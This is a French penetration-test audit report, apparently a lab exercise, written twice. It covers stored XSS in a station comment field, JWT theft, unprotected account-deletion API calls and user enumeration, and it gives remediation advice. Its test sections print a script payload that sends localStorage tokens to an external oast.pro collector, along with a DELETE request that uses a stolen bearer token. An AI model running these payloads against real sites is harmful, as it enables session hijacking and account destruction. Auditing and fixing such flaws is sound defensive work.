# 🔒 Rapport d’Audit Cybersécurité — Vulnérabilité XSS

### 🎯 Cible :
Site web — http://10.33.70.223:8000/

### 📅 Date de l’audit :
06/12/2025

### 👨‍💻 Auditeur :
LaDébauche

## 1. 📋 Contexte
Dans le cadre d’un audit de sécurité, nous avons testé toutes les zones de saisie utilisateur du site, notamment le champ commentaire sur les stations. L’objectif était de détecter la présence de vulnérabilités de type Cross-Site Scripting (XSS).

## 2. ⚠️ Description de la vulnérabilité
### Type :
Cross-Site Scripting (XSS) stocké

### Localisation :
Champ commentaire sur les stations

### Détails :
Le champ commentaire n’échappe pas ni ne filtre correctement les entrées. Il est possible d’injecter du code JavaScript qui sera exécuté sur les navigateurs des visiteurs, ce qui constitue un risque majeur.

## 3. 🧪 Tests réalisés
### Test 1 : injection simple
Payload injecté :
```
<script>alert(1)</script>
```
Résultat :
Une alerte s’affiche immédiatement dans le navigateur → preuve que le XSS est exploitable.

### Test 2 : vol de données via XSS
Payload injecté :
```
<script>
fetch("http://d0ypw08z1wg0000e4rzggoxmqyryyyyyb.oast.pro/capture?ls=" + JSON.stringify(localStorage))
</script>
```
Résultat :
Le script vole le contenu complet du localStorage, incluant notamment des tokens d’authentification, et l’envoie vers un serveur externe contrôlé par l’attaquant.

Exemple de requête interceptée :
```bash
GET /capture?ls={"auth_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...","auth_user":"{\"id\":\"683d6f786e7170f60e39139e\",\"email\":\"oui@oui.com\",\"name\":\"Oui\"}"}
Host: d0ypw08z1wg0000e4rzggoxmqyryyyyyb.oast.pro

```

## 4. 💥 Impact

🚨 Vol des données sensibles (tokens, identifiants…)

🔓 Prise de contrôle possible des comptes utilisateurs

🦠 Propagation de scripts malveillants (keylogger, redirection, etc.)

📉 Perte de confiance des utilisateurs, risques légaux


## 5. 🛠️ Recommandations & Rémédiations

### 5.1 Validation stricte via regex pour le champ commentaire
Empêcher l’injection de caractères spéciaux utilisés dans XSS :
```
[<>{}()"'/;]
```
Ce filtre bloque les caractères < > { } ( ) " ' / ; qui servent à construire des balises ou scripts malveillants.

### 5.2 Assainissement côté serveur
Nettoyer et encoder les entrées avant affichage.

Utiliser des fonctions d’échappement HTML standards.

### 5.3 Mise en place d’une Content Security Policy (CSP)
Limiter les sources de scripts autorisées pour empêcher l’exécution de scripts externes ou injectés.

### 5.4 Validation côté client (optionnelle mais recommandée)
Améliorer l’expérience utilisateur en détectant les erreurs avant l’envoi.

## 6. ✅ Conclusion
La faille XSS détectée est critique et doit être corrigée rapidement pour protéger les utilisateurs et préserver l’intégrité du site. L’implémentation d’un filtrage rigoureux, couplée à une politique CSP, est indispensable.



# 🔒 Rapport d’Audit Cybersécurité — Vulnérabilités XSS & API

## 👥 Équipe : LaDébauche

## 📅 Date : 06/12/2025

## 🌐 Cible : http://10.33.70.223:8000/

## 1. 📋 Contexte
Dans le cadre de notre audit de sécurité, nous avons analysé le site à travers les différents points d'entrée utilisateur. Nos investigations se sont concentrées sur :

🗨️ les champs de commentaires

🔁 les requêtes et endpoints de l’API

🔐 la gestion de l’authentification et des tokens

## 2. ⚠️ Vulnérabilités identifiées
### 2.1 💥 Vulnérabilité XSS (Cross-Site Scripting)
📍 Localisation : champ commentaire des stations
🧪 Payload testé :
```bash
<script>alert(1)</script>
```
et
```bash
<script>
fetch("http://d0ypw08z1wg0000e4rzggoxmqyryyyyyb.oast.pro/capture?ls=" + JSON.stringify(localStorage))
</script>
```

## 📦 Données exfiltrées :
```bash
{
  "auth_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "auth_user": "{\"id\":\"683d6f78...\",\"email\":\"oui@oui.com\",\"name\":\"Oui\"}"
}
```

## 🎯 Impact :
Vol du localStorage, y compris du token JWT ⚠️

Prise de contrôle de session utilisateur

Injection de scripts malveillants pour d'autres utilisateurs

## ✅ Recommandations :
Échapper les caractères spéciaux via regex :
Exemple : ```r'[<>{}()"\'/;]'```

Utiliser des librairies de sanitisation côté back-end (DOMPurify, bleach, etc.)

Appliquer une Content-Security-Policy restrictive

### 2.2 🔓 Exploitation de l’API : token manipulable
📍 Détail : Le token JWT peut être récupéré via XSS ou intercepté via session non sécurisée (pas de HttpOnly). Ensuite, il est possible de :

🧼 Supprimer le compte utilisateur en appelant une route /api/delete avec le token

🛠️ Modifier les données du profil via /api/update

📥 Exemple de requête malveillante :

```bash
DELETE /api/delete_account
Authorization: Bearer <token_volé>
```

🎯 Impact :
Suppression de comptes utilisateurs

Modification de données sensibles

Usurpation d'identité numérique

✅ Recommandations :
Ajouter l’attribut HttpOnly et Secure au cookie du token

Implémenter une vérification côté serveur :

IP ou user-agent liés au token

double vérification avant suppression

Ajouter une confirmation (mot de passe ou 2FA) avant suppression

### 2.3 🧠 Enumeration des utilisateurs
📍 Détail : Le champ auth_user renvoyé contient l’email et nom de l’utilisateur connecté. Cela permet :

de deviner des noms d’utilisateurs valides

de lancer des attaques de brute force sur /login

📥 Exemple de réponse serveur :

```bash
{
  "auth_user": "{\"id\":\"683d6f...\",\"email\":\"oui@oui.com\",\"name\":\"Oui\"}"
}
```
🎯 Impact :
Deviner les comptes existants

Tentatives massives de bruteforce sur les identifiants

Risque de compromission de comptes faibles

✅ Recommandations :
Ne pas exposer les noms/emails via le client sans nécessité

Implémenter une stratégie anti-bruteforce :

limitation du nombre de tentatives (rate limiting)

délai progressif

CAPTCHA

Sur /login, renvoyer un message neutre :

❌ "Identifiants incorrects" (au lieu de préciser si l’email existe)

## 3. 🛠️ Synthèse des Recommandations
🛑 Vulnérabilité	✅ Remédiation principale
XSS	Échapper/sanitiser le HTML + CSP
Token exposé via XSS	HttpOnly, validation serveur, token lié à l'IP
Suppression API sans protection	Confirmation d’action (mot de passe ou 2FA)
Enumeration utilisateur	Masquer infos, ajout CAPTCHA & rate limiting

## 4. ✅ Conclusion
L’audit a permis de mettre en évidence plusieurs vulnérabilités critiques :

Une faille XSS exploitable à distance

Une exposition du token d’authentification

Un défaut de contrôle sur les endpoints API sensibles

Une possibilité d’énumération d’utilisateurs et d'attaque par bruteforce

➡️ Une correction rapide est fortement recommandée pour éviter un détournement de comptes ou une perte de données utilisateurs.


